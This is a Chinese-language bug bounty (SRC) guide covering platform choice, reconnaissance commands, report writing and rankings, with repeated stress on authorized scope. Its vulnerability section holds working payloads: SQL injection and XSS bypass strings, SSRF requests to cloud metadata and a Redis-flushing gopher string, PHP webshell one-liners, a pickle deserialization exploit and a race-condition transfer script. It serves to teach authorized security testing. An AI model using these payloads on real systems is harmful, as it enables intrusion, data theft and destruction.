# SRC实战指南

## 一、SRC平台介绍

### 1.1 什么是SRC

SRC（Security Response Center，安全响应中心）是企业或组织建立的专门接收和处理安全漏洞报告的平台。通过SRC，白帽子黑客可以向企业提交发现的安全漏洞，企业确认后给予相应的奖励和认可。

### 1.2 SRC的意义

**对企业而言：**
- 借助社区力量发现内部安全漏洞
- 降低安全风险，保护用户数据
- 建立良好的安全形象
- 成本效益高于传统安全测试

**对白帽子而言：**
- 合法合规的安全测试渠道
- 获得经济奖励和认可
- 提升技术能力和经验
- 积累行业声誉

### 1.3 国内主要SRC平台

| 平台名称 | 所属企业 | 网址 | 特点 |
|----------|----------|------|------|
| ASRC | 阿里巴巴 | https://asrc.alibaba.com/ | 奖励丰厚，响应快 |
| TSRC | 腾讯 | https://security.tencent.com/ | 业务广泛，积分制 |
| BSRC | 百度 | https://sec.baidu.com/ | 技术氛围好 |
| JSRC | 京东 | https://security.jd.com/ | 电商业务为主 |
| 360SRC | 360 | https://security.360.cn/ | 安全产品多 |
| VSRC | 唯品会 | https://sec.vip.com/ | 电商业务 |
| SF-SRC | 顺丰 | https://security.sf-express.com/ | 物流业务 |
| Meituan SRC | 美团 | https://security.meituan.com/ | 本地生活服务 |

### 1.4 第三方众测平台

| 平台名称 | 网址 | 特点 |
|----------|------|------|
| 补天 | https://www.butian.cn/ | 公安部认证，项目丰富 |
| 漏洞盒子 | https://www.vulbox.com/ | 企业众测项目 |
| 补水 | https://www.hack-one.com/ | 综合众测平台 |
| 众测天下 | https://www.cstis.cn/ | 政府背景 |

---

## 二、平台选择策略

### 2.1 新手入门建议

```markdown
新手选择平台建议：

1. 从小平台开始
   - 竞争相对较小
   - 漏洞类型相对简单
   - 有利于积累经验

2. 选择业务简单的目标
   - 避免复杂的业务逻辑
   - 选择常见技术栈
   - 便于学习和验证

3. 关注测试范围
   - 选择范围明确的目标
   - 避免测试范围模糊的项目
   - 注意禁止测试的内容

4. 仔细阅读规则
   - 漏洞评级标准
   - 奖励规则
   - 禁止行为
```

### 2.2 平台选择因素

#### 2.2.1 奖励因素

```
奖励类型：
├── 现金奖励
│   ├── 按漏洞等级定价
│   └── 不同平台差异较大
│
├── 积分奖励
│   ├── 可兑换礼品
│   └── 累计升级等级
│
└── 荣誉奖励
    ├── 排名榜单位置
    ├── 证书和奖牌
    └── 线下活动邀请
```

#### 2.2.2 竞争因素

```markdown
竞争程度分析：

高竞争平台（阿里、腾讯、百度）：
- 白帽子数量多
- 漏洞发现快
- 需要更高的技术水平
- 需要更多的时间投入

中等竞争平台（京东、美团、唯品会）：
- 白帽子数量适中
- 仍有机会发现漏洞
- 适合有一定经验的白帽子

低竞争平台（中小型企业）：
- 白帽子数量少
- 漏洞发现机会多
- 适合新手入门
```

### 2.3 目标选择技巧

```markdown
目标选择策略：

1. 业务类型选择
   - 电商类：支付、订单、用户中心
   - 社交类：私信、好友、内容发布
   - 金融类：转账、账户、交易
   - 企业类：OA、ERP、内部系统

2. 技术栈选择
   - 选择熟悉的技术栈
   - 了解常见框架漏洞
   - 关注新兴技术风险

3. 测试范围评估
   - 主域名及子域名
   - 移动APP
   - 小程序
   - API接口
   - 第三方服务

4. 避免踩坑
   - 不要测试禁止范围
   - 不要进行破坏性测试
   - 不要泄露漏洞信息
   - 不要重复提交
```

---

## 三、漏洞挖掘技巧

### 3.1 信息收集阶段

#### 3.1.1 域名收集

```bash
# 子域名探测
# 使用Subfinder
subfinder -d target.com -o subdomains.txt

# 使用Amass
amass enum -passive -d target.com -o amass_results.txt

# 使用OneForAll（国内常用）
python oneforall.py --target target.com run

# DNS记录查询
dig target.com ANY
dig target.com TXT
dig target.com MX
```

#### 3.1.2 端口和服务探测

```bash
# 快速端口扫描
masscan -p 1-65535 target.com --rate 1000 -oG masscan.txt

# 服务识别
nmap -sS -sV -iL targets.txt -oA nmap_results

# 常见服务端口
# 80/443 - Web服务
# 8080/8443 - Web服务（备用）
# 21 - FTP
# 22 - SSH
# 3306 - MySQL
# 6379 - Redis
# 27017 - MongoDB
```

#### 3.1.3 目录和文件探测

```bash
# 目录扫描
dirsearch -u https://target.com -e php,html,js,txt

# 敏感文件探测
# 常见敏感文件：
# /.git/config
# /.svn/entries
# /.env
# /web.config
# /WEB-INF/web.xml
# /backup.sql
# /database.sql
# /phpinfo.php
# /.DS_Store
```

### 3.2 常见漏洞挖掘

#### 3.2.1 SQL注入

```bash
# 手工测试
# 单引号测试
?id=1'
?id=1"
?id=1'

# 注释符测试
?id=1'--
?id=1'#
?id=1'/*

# UNION注入
?id=1' UNION SELECT 1,2,3--+
?id=-1' UNION SELECT 1,2,3--+

# 时间盲注
?id=1' AND SLEEP(5)--+
?id=1' AND BENCHMARK(10000000,SHA1('test'))--+

# 使用sqlmap
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" --forms --batch
sqlmap -r request.txt --batch --dbs
```

**SQL注入绕过技巧**

```sql
-- 大小写混合
SeLeCt * FrOm users

-- 编码绕过
%53%45%4C%45%43%54

-- 注释符绕过
SEL/**/ECT * FR/**/OM users

-- 等价函数替换
CONCAT() -> CONCAT_WS()
GROUP_CONCAT() -> CONCAT_WS(,',...)
IF() -> CASE WHEN...THEN...END
SLEEP() -> BENCHMARK()

-- 空白符替代
%09 %0A %0B %0C %0D
```

#### 3.2.2 XSS跨站脚本

```html
<!-- 基础XSS测试 -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

<!-- 绕过过滤 -->
<ScRiPt>alert('XSS')</sCrIpT>
<img src=x onerror="alert('XSS')">
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg/onload=alert('XSS')>

<!-- 事件处理器 -->
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>

<!-- 伪协议 -->
<a href="javascript:alert('XSS')">click</a>
<a href="data:text/html,<script>alert('XSS')</script>">click</a>

<!-- 模板注入 -->
{{constructor.constructor('alert(1)')()}}
${alert(1)}
#{alert(1)}
```

#### 3.2.3 SSRF服务端请求伪造

```bash
# 内网探测
?url=http://127.0.0.1:22
?url=http://127.0.0.1:6379
?url=http://192.168.1.1

# 云元数据获取
?url=http://169.254.169.254/latest/meta-data/
?url=http://metadata.google.internal/computeMetadata/v1/
?url=http://169.254.169.254/metadata/v1/

# 协议利用
?url=dict://127.0.0.1:6379/info
?url=file:///etc/passwd
?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a

# DNS重绑定
# 使用DNS重绑定服务绕过IP限制
```

#### 3.2.4 文件上传漏洞

```bash
# 前端绕过
# 修改文件后缀：.php -> .jpg
# 修改Content-Type：application/php -> image/jpeg

# 后端绕过
# 双写后缀：.php.jpg
# 空字节截断：.php%00.jpg
# 大小写混合：.pHp
# 替代后缀：.php5, .phtml, .phps

# 图片马制作
copy normal.jpg/b + shell.php/a webshell.jpg

# 常见WebShell
<?php @eval($_POST['cmd']);?>
<?=@eval($_POST['cmd']);?>
<?php system($_GET['cmd']);?>

# .htaccess上传
AddType application/x-httpd-php .jpg
```

#### 3.2.5 逻辑漏洞

**越权漏洞**

```markdown
水平越权测试：
1. 登录用户A，获取用户A的信息接口
2. 修改用户ID参数为用户B的ID
3. 观察是否能获取用户B的信息

垂直越权测试：
1. 登录普通用户，获取管理员功能接口
2. 直接访问管理员接口
3. 观察是否能执行管理员操作

测试要点：
- 修改用户ID参数
- 修改Cookie/Token
- 修改请求方法
- 修改请求路径
```

**支付逻辑漏洞**

```markdown
支付漏洞测试点：

1. 金额篡改
   - 修改前端价格参数
   - 修改请求包中的金额
   - 尝试负数金额

2. 数量篡改
   - 修改购买数量为负数
   - 修改购买数量为小数
   - 修改库存限制

3. 优惠券滥用
   - 重复使用优惠券
   - 使用他人优惠券
   - 修改优惠金额

4. 订单状态篡改
   - 修改支付状态
   - 修改订单状态
   - 重放支付请求
```

### 3.3 高级漏洞挖掘

#### 3.3.1 JWT安全问题

```bash
# JWT结构
Header.Payload.Signature

# 常见漏洞
# 1. 算法修改为none
{"alg":"none","typ":"JWT"}

# 2. 算法混淆（RS256 -> HS256）
# 使用公钥作为HMAC密钥

# 3. 弱密钥爆破
# 使用jwt_tool或hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# 4. 敏感信息泄露
# 解码Payload查看是否包含敏感信息

# JWT调试工具
# https://jwt.io/
# jwt_tool.py
```

#### 3.3.2 反序列化漏洞

```python
# Python反序列化
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())

# Java反序列化
# 使用ysoserial工具
java -jar ysoserial.jar CommonsCollections1 "whoami"

# PHP反序列化
# 构造POP链
```

#### 3.3.3 条件竞争

```python
# 条件竞争测试脚本
import threading
import requests

url = "https://target.com/api/transfer"
payload = {"amount": 100, "to": "attacker"}

def send_request():
    requests.post(url, data=payload, cookies=cookies)

threads = []
for i in range(100):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

---

## 四、报告编写规范

### 4.1 报告结构

```markdown
漏洞报告标准结构：

1. 漏洞标题
   - 简洁明了，包含漏洞类型
   - 例：某系统存在SQL注入漏洞

2. 漏洞等级
   - 根据平台标准评定
   - 严重/高危/中危/低危

3. 漏洞描述
   - 漏洞原理说明
   - 漏洞影响范围
   - 漏洞危害分析

4. 漏洞复现
   - 详细步骤说明
   - 截图或视频证明
   - PoC代码（如有）

5. 修复建议
   - 具体修复方案
   - 参考文档链接
```

### 4.2 报告模板

```markdown
### 漏洞标题：[目标系统]存在[漏洞类型]漏洞

**漏洞等级**：[严重/高危/中危/低危]

**漏洞地址**：https://target.com/page

**漏洞描述**：
在[目标系统]的[功能模块]中存在[漏洞类型]漏洞。攻击者可以通过[攻击方式]获取[敏感信息/系统权限]，造成[具体危害]。

**复现步骤**：
1. 访问目标URL：https://target.com/page
2. 在参数[参数名]处输入payload：[具体payload]
3. 观察返回结果，确认漏洞存在
4. [其他步骤...]

**PoC/请求包**：
```
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

param=payload
```

**影响范围**：
- 影响用户数据：[是/否]
- 影响系统配置：[是/否]
- 影响服务可用性：[是/否]

**修复建议**：
1. [具体修复方案]
2. [参考链接]

**测试时间**：2026-XX-XX
**测试人员**：[昵称]
```

### 4.3 报告质量要求

```markdown
高质量报告要求：

1. 复现步骤清晰
   - 步骤完整，可复现
   - 包含必要的截图
   - 提供完整的请求包

2. 漏洞描述准确
   - 技术原理正确
   - 影响分析到位
   - 不夸大漏洞危害

3. 修复建议可行
   - 建议具体可操作
   - 提供参考文档
   - 考虑业务影响

4. 格式规范
   - 使用Markdown格式
   - 代码块正确标注
   - 图片清晰可见

5. 避免问题
   - 不要提交重复漏洞
   - 不要提交无意义漏洞
   - 不要夸大漏洞等级
```

---

## 五、排名与奖励策略

### 5.1 积分机制

```markdown
常见积分机制：

1. 漏洞积分
   - 严重漏洞：100-500分
   - 高危漏洞：50-100分
   - 中危漏洞：10-50分
   - 低危漏洞：1-10分

2. 首次发现奖励
   - 首次发现特定类型漏洞额外奖励
   - 新业务首次漏洞奖励

3. 连续提交奖励
   - 月度连续提交奖励
   - 季度连续提交奖励

4. 积分兑换
   - 兑换礼品
   - 兑换现金
   - 兑换特权
```

### 5.2 排名规则

```markdown
排名影响因素：

1. 漏洞数量
   - 有效漏洞数量
   - 不同类型漏洞

2. 漏洞质量
   - 高危漏洞权重更高
   - 严重漏洞权重最高

3. 响应效率
   - 漏洞确认速度
   - 修复配合程度

4. 时间周期
   - 月度排名
   - 季度排名
   - 年度排名
```

### 5.3 提升排名策略

```markdown
排名提升策略：

1. 提升漏洞质量
   - 关注高危漏洞类型
   - 深挖业务逻辑漏洞
   - 发现组合漏洞链

2. 增加漏洞数量
   - 扩大测试范围
   - 关注边缘业务
   - 持续挖掘新目标

3. 提高效率
   - 自动化信息收集
   - 建立漏洞模板库
   - 积累经验提高速度

4. 选择合适目标
   - 选择竞争较小的目标
   - 选择业务复杂的目标
   - 关注新上线业务
```

---

## 六、常见问题解答

### 6.1 法律合规问题

```markdown
Q: SRC测试是否合法？
A: 在SRC平台授权范围内进行测试是合法的。但需要注意：
   1. 必须在平台注册并同意规则
   2. 测试范围必须在授权范围内
   3. 不得进行破坏性测试
   4. 不得泄露漏洞信息
   5. 测试完成后及时提交报告

Q: 误操作导致服务异常怎么办？
A: 1. 立即停止测试
   2. 及时联系平台运营
   3. 说明情况和原因
   4. 配合问题排查

Q: 可以公开披露漏洞吗？
A: 未经企业允许，不得公开披露漏洞详情。
   一般需要等待漏洞修复后，经企业同意才能公开。
```

### 6.2 技术问题

```markdown
Q: 如何提高漏洞发现率？
A: 1. 扩大信息收集范围
   2. 深入理解业务逻辑
   3. 积累常见漏洞模式
   4. 使用自动化工具辅助
   5. 关注边缘功能和接口

Q: 漏洞被别人抢先提交了怎么办？
A: SRC一般采用首次发现原则，先提交者获得奖励。
   建议：
   1. 发现漏洞后尽快提交
   2. 可以先提交简单报告，再补充详情
   3. 关注漏洞修复进度，可能发现关联漏洞

Q: 漏洞等级被降低了怎么办？
A: 1. 与审核人员沟通
   2. 补充漏洞影响证明
   3. 提供更详细的危害分析
   4. 理性对待，避免争执
```

### 6.3 平台规则问题

```markdown
Q: 测试范围如何确定？
A: 1. 查看平台公告和规则
   2. 查看具体项目的测试范围
   3. 不确定的可以咨询运营
   4. 默认只测试主域名相关服务

Q: 哪些行为是禁止的？
A: 常见禁止行为：
   1. DDoS攻击
   2. 社会工程学攻击
   3. 物理安全测试
   4. 破坏性测试
   5. 泄露用户数据
   6. 在漏洞修复前公开

Q: 奖励什么时候发放？
A: 不同平台规则不同：
   1. 漏洞确认后发放
   2. 漏洞修复后发放
   3. 月度/季度统一发放
   具体查看平台规则
```

---

## 七、实战经验分享

### 7.1 新手常见错误

```markdown
新手常见错误：

1. 测试范围不清
   - 错误：测试未授权的系统
   - 正确：仔细阅读测试范围

2. 漏洞报告不规范
   - 错误：描述不清，无法复现
   - 正确：提供详细步骤和证明

3. 漏洞等级评估不准
   - 错误：夸大漏洞危害
   - 正确：客观评估漏洞影响

4. 重复提交
   - 错误：提交已知漏洞
   - 正确：先搜索是否已存在

5. 泄露漏洞信息
   - 错误：公开分享漏洞详情
   - 正确：等待修复后再讨论
```

### 7.2 高效挖掘技巧

```markdown
高效挖掘技巧：

1. 自动化信息收集
   - 编写自动化脚本
   - 使用综合工具
   - 建立资产清单

2. 漏洞模式积累
   - 记录成功案例
   - 总结漏洞模式
   - 建立测试checklist

3. 业务理解深入
   - 理解业务流程
   - 分析业务逻辑
   - 关注关键功能

4. 工具组合使用
   - 被动扫描 + 主动测试
   - 自动化 + 手工验证
   - 通用工具 + 专用工具

5. 持续学习
   - 关注新技术漏洞
   - 学习他人经验
   - 参与社区交流
```

### 7.3 成功案例分享

```markdown
案例1：某电商支付逻辑漏洞
- 发现过程：测试支付流程时发现金额可篡改
- 漏洞类型：逻辑漏洞
- 漏洞等级：高危
- 经验总结：关注关键业务流程，测试参数篡改

案例2：某社交平台越权漏洞
- 发现过程：修改用户ID可访问他人私密内容
- 漏洞类型：越权漏洞
- 漏洞等级：高危
- 经验总结：测试所有涉及用户ID的接口

案例3：某企业系统SSRF漏洞
- 发现过程：图片上传功能可访问内网
- 漏洞类型：SSRF
- 漏洞等级：高危
- 经验总结：关注所有URL参数，测试内网访问
```

---

## 八、工具推荐

### 8.1 信息收集工具

| 工具名称 | 用途 | 链接 |
|----------|------|------|
| Subfinder | 子域名探测 | github.com/projectdiscovery/subfinder |
| Amass | 子域名探测 | github.com/OWASP/Amass |
| OneForAll | 综合收集 | github.com/shmilylty/OneForAll |
| Nmap | 端口扫描 | nmap.org |
| Masscan | 快速扫描 | github.com/robertdavidgraham/masscan |

### 8.2 漏洞扫描工具

| 工具名称 | 用途 | 链接 |
|----------|------|------|
| Nuclei | 漏洞扫描 | github.com/projectdiscovery/nuclei |
| Xray | 被动扫描 | github.com/chaitin/xray |
| Goby | 资产扫描 | gobiesec.com |
| AWVS | Web扫描 | www.acunetix.com |
| Burp Suite | Web代理 | portswigger.net/burp |

### 8.3 专用工具

| 工具名称 | 用途 | 链接 |
|----------|------|------|
| sqlmap | SQL注入 | github.com/sqlmapproject/sqlmap |
| JWT_Tool | JWT测试 | github.com/ticarpi/jwt_tool |
| ysoserial | Java反序列化 | github.com/frohoff/ysoserial |
| dirsearch | 目录扫描 | github.com/maurosoria/dirsearch |
| hydra | 暴力破解 | github.com/vanhael-thc/thc-hydra |

---

## 九、总结

### 9.1 SRC实战要点

```markdown
SRC实战核心要点：

1. 合法合规
   - 在授权范围内测试
   - 遵守平台规则
   - 保护用户数据

2. 技术扎实
   - 掌握常见漏洞原理
   - 熟练使用测试工具
   - 持续学习新技术

3. 报告规范
   - 详细可复现
   - 客观不夸大
   - 建议可操作

4. 持续积累
   - 总结经验教训
   - 建立漏洞模式库
   - 提升效率和质量
```

### 9.2 进阶建议

```markdown
SRC进阶建议：

1. 从小目标开始，逐步挑战大目标
2. 关注业务逻辑漏洞，提高漏洞质量
3. 建立自动化工作流，提高效率
4. 参与社区交流，学习他人经验
5. 保持耐心和细心，持续挖掘
```

---

*本文档为网络安全教程进阶篇内容，仅供学习参考，请勿用于非法用途。*
